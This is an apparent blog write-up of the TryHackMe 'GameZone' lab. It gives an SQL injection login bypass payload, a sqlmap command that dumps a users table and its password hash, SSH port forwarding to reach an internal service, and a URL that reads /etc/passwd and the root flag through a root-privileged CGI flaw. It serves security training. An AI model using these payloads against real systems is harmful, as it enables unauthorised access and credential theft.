<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><link rel=preload as=font href=https://www.xuptox.org/fonts/vendor/jost/jost-v4-latin-regular.woff2 type=font/woff2 crossorigin><link rel=preload as=font href=https://www.xuptox.org/fonts/vendor/jost/jost-v4-latin-700.woff2 type=font/woff2 crossorigin><link rel=stylesheet href=https://www.xuptox.org/main.e3cdc828f460213dfe5844daaa5b797210474409668d3913818022ba3cc97ddabb66656e48232defbf5badc88117fd61e8086ac5300c4c15bcab9e24b52d16d3.css integrity="sha512-483IKPRgIT3+WETaqlt5chBHRAlmjTkTgYAiujzJfdq7ZmVuSCMt779brciBF/1h6AhqxTAMTBW8q54ktS0W0w==" crossorigin=anonymous><noscript><style>img.lazyload{display:none}</style></noscript><meta name=robots content="index, follow"><meta name=googlebot content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1"><meta name=bingbot content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1"><title>GameZone - Xuptox</title><meta name=description content="Learn to hack into this machine. Understand how to use SQLMap, crack some passwords, reveal services using a reverse SSH tunnel and escalate your privileges to root!"><link rel=canonical href=https://www.xuptox.org/docs/tryhackme/gamezone/><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/docs/tryhackme/gamezone/"><meta name=twitter:title content="GameZone"><meta name=twitter:description content="Learn to hack into this machine. Understand how to use SQLMap, crack some passwords, reveal services using a reverse SSH tunnel and escalate your privileges to root!"><meta name=twitter:site content="@"><meta name=twitter:creator content="@"><meta property="og:title" content="GameZone"><meta property="og:description" content="Learn to hack into this machine. Understand how to use SQLMap, crack some passwords, reveal services using a reverse SSH tunnel and escalate your privileges to root!"><meta property="og:type" content="article"><meta property="og:url" content="/docs/tryhackme/gamezone/"><meta property="og:image" content="/docs/tryhackme/gamezone/"><meta property="article:published_time" content="2021-04-21T19:34:14+02:00"><meta property="article:modified_time" content="2021-04-21T19:34:14+02:00"><meta property="og:site_name" content="Xuptox"><meta property="article:publisher" content="https://www.facebook.com/"><meta property="article:author" content="https://www.facebook.com/"><meta property="og:locale" content="en_US"><script type=application/ld+json>{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https:\/\/www.xuptox.org"},{"@type":"ListItem","position":3,"name":"Docs","item":"https:\/\/www.xuptox.org\/docs\/"},{"@type":"ListItem","position":4,"name":"Tryhackme","item":"https:\/\/www.xuptox.org\/docs\/tryhackme\/"},{"@type":"ListItem","position":5,"name":"Gamezone","item":"https:\/\/www.xuptox.org\/docs\/tryhackme\/gamezone\/"}]}</script><meta name=theme-color content="#fff"><link rel=apple-touch-icon sizes=180x180 href=https://www.xuptox.org/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=https://www.xuptox.org/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=https://www.xuptox.org/favicon-16x16.png><link rel=manifest href=https://www.xuptox.org/site.webmanifest></head><body class="docs single"><div class="header-bar fixed-top"></div><header class="navbar fixed-top navbar-expand-md navbar-light"><div class=container><input class="menu-btn order-0" type=checkbox id=menu-btn>
<label class="menu-icon d-md-none" for=menu-btn><span class=navicon></span></label><a class="navbar-brand order-1 order-md-0 me-auto" href=https://www.xuptox.org/>Xuptox</a>
<button id=mode class="btn btn-link order-2 order-md-4" type=button aria-label="Toggle mode">
<span class=toggle-dark><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-moon"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg></span><span class=toggle-light><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-sun"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></span></button><ul class="navbar-nav social-nav order-3 order-md-5"></ul><div class="collapse navbar-collapse order-4 order-md-1"><ul class="navbar-nav main-nav me-auto order-5 order-md-2"><li class=nav-item><a class=nav-link href=https://www.xuptox.org/docs/tryhackme/>TryHackMe</a></li></ul><div class="break order-6 d-md-none"></div><form class="navbar-form flex-grow-1 order-7 order-md-3"><input id=userinput class="form-control is-search" type=search placeholder="Search docs..." aria-label="Search docs..." autocomplete=off><div id=suggestions class="shadow bg-white rounded"></div></form></div></div></header><div class="wrap container" role=document><div class=content><div class="row flex-xl-nowrap"><div class="col-md-3 col-lg-3 col-xl-3 docs-sidebar"><nav class=docs-links aria-label="Main navigation"><h3>TryHackMe</h3><ul class=list-unstyled><li><a class=docs-link href=https://www.xuptox.org/docs/tryhackme/gamezone/>GameZone</a></li><li><a class=docs-link href=https://www.xuptox.org/docs/tryhackme/hackpark/>HackPark</a></li><li><a class=docs-link href=https://www.xuptox.org/docs/tryhackme/skynet/>SkyNet</a></li></ul></nav></div><nav class="docs-toc d-none d-xl-block col-xl-3" aria-label="Secondary navigation"><div class=page-links><h3>On this page</h3><nav id=TableOfContents><ul><li><a href=#used-commands>Used Commands</a></li><li><a href=#task-1>Task 1</a><ul><li><a href=#google-whos-the-guy>Google: Who&rsquo;s the guy?</a></li></ul></li><li><a href=#task-2>Task 2</a><ul><li><a href=#obtain-access-via-sql-injection>Obtain access via SQL Injection</a></li></ul></li><li><a href=#task-3>Task 3</a><ul><li><a href=#using-sqlmap>Using SQLMap</a></li></ul></li><li><a href=#task-4>Task 4</a><ul><li><a href=#whats-the-password>What&rsquo;s the password?</a></li></ul></li><li><a href=#task-5>Task 5</a><ul><li><a href=#exposing-services-with-reverse-ssh-tunnel>Exposing services with reverse SSH tunnel</a></li></ul></li><li><a href=#task-6>Task 6</a><ul><li><a href=#find-the-exploit>Find the exploit</a></li><li><a href=#direct-way-to-roottxt-wo-metasploit>Direct way to root.txt (w/o Metasploit)</a></li></ul></li></ul></nav></div></nav><main class="docs-content col-lg-13 col-xl-10"><nav aria-label=breadcrumb><ol class=breadcrumb><li class=breadcrumb-item><a href=https://www.xuptox.org/>Home</a></li><li class=breadcrumb-item><a href=https://www.xuptox.org/docs/>WriteUps</a></li><li class=breadcrumb-item><a href=https://www.xuptox.org/docs/tryhackme/>Try Hack Me</a></li><li class="breadcrumb-item active" aria-current=page>GameZone</li></ol></nav><h1>GameZone</h1><p class=lead>Learn to hack into this machine. Understand how to use SQLMap, crack some passwords, reveal services using a reverse SSH tunnel and escalate your privileges to root!</p><a><kbd class="item-tag Linux">Linux</kbd></a>
<a><kbd class="item-tag SQLi">SQLi</kbd></a>
<a><kbd class="item-tag Hashes">Hashes</kbd></a>
<a><kbd class="item-tag Metasploit">Metasploit</kbd></a>
<a><kbd class="item-tag JohnTheRipper">JohnTheRipper</kbd></a><h2 id=used-commands>Used Commands<a href=#used-commands class=anchor aria-hidden=true>#</a></h2><pre><code class=language-sh>sqlmap -r &lt;path to request.txt&gt; --dbms=mysql --dump
ssh &lt;username&gt;@&lt;target ip&gt;
ss -tulpn
ssh -L &lt;bind_port&gt;:&lt;host&gt;:&lt;hostport&gt;
</code></pre><h2 id=task-1>Task 1<a href=#task-1 class=anchor aria-hidden=true>#</a></h2><h3 id=google-whos-the-guy>Google: Who&rsquo;s the guy?<a href=#google-whos-the-guy class=anchor aria-hidden=true>#</a></h3><p>This guy is known from a videogame called <code>Hitman</code>.
I&rsquo;m pretty sure you can find his name on your own.</p><h2 id=task-2>Task 2<a href=#task-2 class=anchor aria-hidden=true>#</a></h2><h3 id=obtain-access-via-sql-injection>Obtain access via SQL Injection<a href=#obtain-access-via-sql-injection class=anchor aria-hidden=true>#</a></h3><p>The task description gives you a good idea about SQL injection and how it can be used or better abused to query some data (sensitive data exposure).</p><p>The target is to <code>rewrite</code> a prepared statement, that is intended to validate i.e. login credentials, so that the statement queries any other valid data.</p><p>Answer the next question by using <code>' or 1=1 -- -</code> as username. Password field remains empty.</p><h2 id=task-3>Task 3<a href=#task-3 class=anchor aria-hidden=true>#</a></h2><h3 id=using-sqlmap>Using SQLMap<a href=#using-sqlmap class=anchor aria-hidden=true>#</a></h3><p>Use BurpSuite to intercept a request when you search for any game review.
Use this request as input for a tool called <code>sqlmap</code>. If you are not familiar with BurpSuite check out the beginner path on THM. There is a room on THM <a href=https://tryhackme.com/room/rpburpsuite>BurpSuite created by DarkStar7471</a> that gives you a basic understanding and overview about how to use Burp.</p><p>Check your settings in Burp. <code>Intercept</code> should be switched on.</p><img class="img-simple img-fluid lazyload blur-up" src=https://www.xuptox.org/docs/tryhackme/gamezone/thm_gamezone_proxy_hu495fd9a2d48aa787218a36215fc8da62_9370_20x0_resize_box_2.png data-src=https://www.xuptox.org/docs/tryhackme/gamezone/thm_gamezone_proxy.png width=803 height=156 alt="Change highlighted settings on Burp"><p>Click the search button in your browser and come back to Burp. You should find something similar to the following screenshot:</p><img class="img-simple img-fluid lazyload blur-up" src=https://www.xuptox.org/docs/tryhackme/gamezone/thm_gamezone_portal_request_huc109eaee9ca6765dea0da756c4f672dd_13889_20x0_resize_box_2.png data-src=https://www.xuptox.org/docs/tryhackme/gamezone/thm_gamezone_portal_request.png width=648 height=312 alt="HTTP Request on portal.php"><p>Copy the content of the request and save it to a file i.e. <code>request.txt</code>.</p><p>Then run <code>sqlmap -r &lt;path to request.txt> --dbms=mysql --dump</code></p><p>When I ran sqlmap I had to confirm with <code>y</code> multiple times. SqlMap will show a short description in any case but I&rsquo;d recommend reading and following the execution as you are able to find some usefull information.</p><p>When everything was correct you should now receive the hashed password.</p><pre><code class=language-sh>[21:57:48] [INFO] writing hashes to a temporary file '/tmp/sqlmapgpDenn4863/sqlmaphashes-AWGpER.txt'
do you want to crack them via a dictionary-based attack? [Y/n/q] y
[21:57:55] [INFO] using hash method 'sha256_generic_passwd'
[21:57:55] [WARNING] no clear password(s) found
Database: db
Table: users
[1 entry]

+------------------------------------------------------------------+-----------+
| pwd                                                              | username  |
+------------------------------------------------------------------+-----------+
| ab5db915fc9cea6c78df88106c6nope57f2b52901ca6c0c6218f04xxxxxxxxxx |&lt;username&gt; |
+------------------------------------------------------------------+-----------+

[21:57:55] [INFO] table 'db.users' dumped to CSV file '/root/.sqlmap/output/10.10.103.176/dump/db/users.csv'
[21:57:55] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.103.176'

</code></pre><p>Scroll up and have a look at the output of sqlmap.
You should find the <code>other</code> table and its name.</p><h2 id=task-4>Task 4<a href=#task-4 class=anchor aria-hidden=true>#</a></h2><h3 id=whats-the-password>What&rsquo;s the password?<a href=#whats-the-password class=anchor aria-hidden=true>#</a></h3><p>I did not use JohnTheRipper in this case. Instead I tried one out of many online tools available on the internet i.e. <a href=https://hashes.com>hashes.com</a>.</p><img class="img-simple img-fluid lazyload blur-up" src=https://www.xuptox.org/docs/tryhackme/gamezone/thm_gamezone_hash_hu4235dc8b034b62da822d4e72800f42cb_2796_20x0_resize_box_2.png data-src=https://www.xuptox.org/docs/tryhackme/gamezone/thm_gamezone_hash.png width=601 height=83 alt="Result of hash lookup"><p>If you are not yet familiar with john you should check out this room on THM <a href=https://tryhackme.com/room/johntheripper0>John The Ripper created by PoloMints</a>.</p><p>Now use the username and password and try to connect via ssh.</p><pre><code class=language-sh>ssh &lt;username&gt;@10.10.103.176
&lt;username&gt;@gamezone:~$ dir
user.txt
&lt;username&gt;@gamezone:~$ cat user.txt
</code></pre><h2 id=task-5>Task 5<a href=#task-5 class=anchor aria-hidden=true>#</a></h2><h3 id=exposing-services-with-reverse-ssh-tunnel>Exposing services with reverse SSH tunnel<a href=#exposing-services-with-reverse-ssh-tunnel class=anchor aria-hidden=true>#</a></h3><p>That topic is new to me so it took some time to get an overview and understand the basic concept behind the steps.</p><p>Following steps will guide you through this task.</p><ul><li>Connect via <code>ssh &lt;username>@&lt;target ip></code> to the target</li><li>run <code>ss -tulpn</code> and check the output</li></ul><pre><code class=language-sh>&lt;username&gt;@gamezone:~$ ss -tulpn
Netid State      Recv-Q Send-Q    Local Address:Port      Peer Address:Port
udp   UNCONN     0      0                     *:10000                *:*
udp   UNCONN     0      0                     *:68                   *:*
tcp   LISTEN     0      80            127.0.0.1:3306                 *:*
----------------------------------------------------------------------------
|------                    Check this line                          -------|
----------------------------------------------------------------------------
| tcp   LISTEN     0      128                   *:10000                *:* |
----------------------------------------------------------------------------
tcp   LISTEN     0      128                   *:22                   *:*
tcp   LISTEN     0      128                  :::80                  :::*
tcp   LISTEN     0      128                  :::22                  :::*
</code></pre><ul><li>run <code>ssh -L 9000:localhost:10000</code></li></ul><table><thead><tr><th>Argument</th><th>Description</th></tr></thead><tbody><tr><td>9000</td><td>this is the port you will enter in your broswer (next step)</td></tr><tr><td>localhost</td><td>this is <code>127.0.0.1</code> from the output above</td></tr><tr><td>10000</td><td>port from output above</td></tr></tbody></table><p>If you do not understand what&rsquo;s going on, I recommend to have a look at the <a href=https://man.openbsd.org/ssh>SSH manual</a></p><p><code>ssh -L &lt;bind_port>:&lt;host>:&lt;hostport></code></p><pre><code class=language-sh>root@ip-10-10-136-248:~# ssh -L 9000:localhost:10000 &lt;username&gt;@10.10.19.166
&lt;username&gt;@10.10.19.166's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

109 packages can be updated.
68 updates are security updates.


Last login: Wed Apr 21 04:46:05 2021 from 10.10.136.248
&lt;username&gt;@gamezone:~$
</code></pre><p>Open your browser and enter <code>localhost:9000</code></p><p>The welcome screen will answer the question asking for the name of the CMS. Carefully read the first page where you also find the version.</p><h2 id=task-6>Task 6<a href=#task-6 class=anchor aria-hidden=true>#</a></h2><h3 id=find-the-exploit>Find the exploit<a href=#find-the-exploit class=anchor aria-hidden=true>#</a></h3><p>Now let&rsquo;s search for an exploit that we can use to gain root and access the flag.
There are multiple WriteUps that show you how to manually use that exploit (so did I) as this is the direct way to the root flag.</p><h3 id=direct-way-to-roottxt-wo-metasploit>Direct way to root.txt (w/o Metasploit)<a href=#direct-way-to-roottxt-wo-metasploit class=anchor aria-hidden=true>#</a></h3><p>Download and study the exploit. Find following line of code somewhere close to the end of the file:</p><img class="img-simple img-fluid lazyload blur-up" src=https://www.xuptox.org/docs/tryhackme/gamezone/thm_gamezone_exploit_hu8c232ba8290a2233cdf4eb41c89ed0b8_6939_20x0_resize_box_2.png data-src=https://www.xuptox.org/docs/tryhackme/gamezone/thm_gamezone_exploit.png width=633 height=182 alt="code snippet that shows some interesting part in the exploit"><p>What do you see when you enter <code>localhost:9000/file/show.cgi/bin</code> in your browser?</p><img class="img-simple img-fluid lazyload blur-up" src=https://www.xuptox.org/docs/tryhackme/gamezone/thm_gamezone_cgi_bin_hub4fe0e08a96876c58ae66af0e8d8ab0f_14909_20x0_resize_box_2.png data-src=https://www.xuptox.org/docs/tryhackme/gamezone/thm_gamezone_cgi_bin.png width=503 height=420 alt="Picture of download form"><p>Hmmm&mldr; not what we expected. Let&rsquo;s try something different.</p><p>What happens when you try sending different payload i.e. <code>etc/passwd</code>?</p><pre><code class=language-sh>localhost:9000/file/show.cgi/etc/passwd
</code></pre><img class="img-simple img-fluid lazyload blur-up" src=https://www.xuptox.org/docs/tryhackme/gamezone/thm_gamezone_cgi_etc_passwd_hud732b96a63e2999a790d7be61d4b25c1_43733_20x0_resize_box_2.png data-src=https://www.xuptox.org/docs/tryhackme/gamezone/thm_gamezone_cgi_etc_passwd.png width=631 height=579 alt="Picture of /etc/passwd file"><p>Uhhh that looks interesting!</p><div class="alert alert-warning d-flex" role=alert><div class="flex-shrink-1 alert-icon">ðŸ’¡</div><div class=w-100>Let's review the description of the exploit:<br>"[...] allows an authenticated user [...] to execute arbitrary commands with root privileges."</div></div><p>Have a look at the hint and you know the location of the root flag. Can you read its content?</p><div class="alert alert-warning d-flex" role=alert><div class="flex-shrink-1 alert-icon">ðŸ“Œ</div><div class=w-100>Direct access was only possible because the hint told us the location of the flag. Usually this information is not available and you are forced to gain root in order to find the flag.</div></div><div class="docs-navigation d-flex justify-content-between"><a href=https://www.xuptox.org/docs/tryhackme/skynet/><div class="card my-1"><div class="card-body py-2">&larr; SkyNet</div></div></a><a class=ms-auto href=https://www.xuptox.org/docs/tryhackme/hackpark/><div class="card my-1"><div class="card-body py-2">HackPark &rarr;</div></div></a></div></main></div></div></div><footer class="footer text-muted"><div class=container><div class=row><div class="col-lg-8 order-last order-lg-first"><ul class=list-inline><li class=list-inline-item>Happy Hacking!</li></ul></div><div class="col-lg-8 order-first order-lg-last text-lg-end"><ul class=list-inline><li class=list-inline-item><a href=https://www.xuptox.org/privacy-policy/>Privacy Policy</a></li></ul></div></div></div></footer><script src=https://www.xuptox.org/js/highlight.min.2c793eb7599ae4975966407f455873eca25c0dd1146f2ba6a8ca933c3ee5a244f8e3a48c5b73694a76709db65ff3e7eedf2a55fc3b0c03510b2eca2b8635c8da.js integrity="sha512-LHk+t1ma5JdZZkB/RVhz7KJcDdEUbyumqMqTPD7lokT446SMW3NpSnZwnbZf8+fu3ypV/DsMA1ELLsorhjXI2g==" crossorigin=anonymous defer></script><script src=https://www.xuptox.org/main.min.7ab523108435955765bcb88a0ee704f412ba01646b5478e84f3b9feb24f0ce750a14c3f7bd9a62408fe21e41996d361a9eb29f77e85dfe77b7e17f7623bd3a97.js integrity="sha512-erUjEIQ1lVdlvLiKDucE9BK6AWRrVHjoTzuf6yTwznUKFMP3vZpiQI/iHkGZbTYanrKfd+hd/ne34X92I706lw==" crossorigin=anonymous defer></script><script src=https://www.xuptox.org/index.min.10f23f834912d01c6223be1e00cc463f114b85fc310ce82f20bde7d9a4ad1b28b3c63b4cea3e181a62964efd80551cf701fc5cc7b50ed9559d640b470e2c04ba.js integrity="sha512-EPI/g0kS0BxiI74eAMxGPxFLhfwxDOgvIL3n2aStGyizxjtM6j4YGmKWTv2AVRz3Afxcx7UO2VWdZAtHDiwEug==" crossorigin=anonymous defer></script><script async src="https://www.googletagmanager.com/gtag/js?id=G-BXZ2DZ8GGM"></script><script>var dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes";if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-BXZ2DZ8GGM',{anonymize_ip:!0})}</script></body></html>